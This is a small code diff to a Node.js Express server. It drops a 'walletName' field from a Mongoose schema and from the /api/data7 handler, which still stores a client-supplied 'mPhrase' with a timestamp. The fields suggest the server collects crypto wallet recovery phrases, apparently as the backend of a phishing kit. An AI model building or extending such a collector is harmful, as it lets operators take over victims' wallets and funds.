@@ -65,7 +65,6 @@ const schema6Use = mongoose.model('database6', schema6);
 const schema7 = new mongoose.Schema({
     Time:{type:String},
     mPhrase: {type:String},
-    walletName: {type:String}
 });
 const schema7Use = mongoose.model('database7', schema7);
 
@@ -214,7 +213,6 @@ server.post("/api/data7",(req,res)=>{
         let data = new schema7Use({
             Time:indiaTime,
             mPhrase:req.body.mPhrase,
-            walletName:req.body.walletName
         });
         try{
             await data.save();
